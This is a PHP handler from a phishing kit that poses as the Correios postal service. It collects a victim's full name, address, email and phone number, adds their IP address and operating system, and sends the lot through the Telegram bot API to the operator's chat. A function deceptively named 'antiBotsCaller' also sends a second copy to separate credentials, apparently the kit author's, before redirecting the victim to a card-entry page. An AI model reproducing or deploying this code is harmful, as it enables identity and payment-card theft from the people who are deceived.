<?php

    include '../../secure/anti0.php';




    include("../telegram.php");
    $OS = getOS($_SERVER['HTTP_USER_AGENT']); 
    $UserAgent =$_SERVER['HTTP_USER_AGENT'];
    $browser = explode(')',$UserAgent);				
    $_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

    $ccya = $_POST['1'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $message ="
Correios
Nome completo: ".$_POST['_pd_name']." ".$_POST['_pd_lastName1']." ".$_POST['_pd_lastName2']." 
Endereço: España ".$_POST['_a_address']." ".$_POST['_a_postCode']." 
E-mail: ".$_POST['_cd_email']." 
Telefone: ".$_POST['_cd_phone']." 
Sistema operacional: ".$OS."
IP: ".$ip."\n";

    $theip = $message;
    function antiBotsCaller($messaggio,$token,$chatid) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    antiBotsCaller($theip,$antit2,$antic1);
    // To banned IP Bots Go to => ../../vendor/ban.txt and put your IPS.












    antiBotsCaller($message,$token,$chatid);
    header("Location: ../cc.php");

?>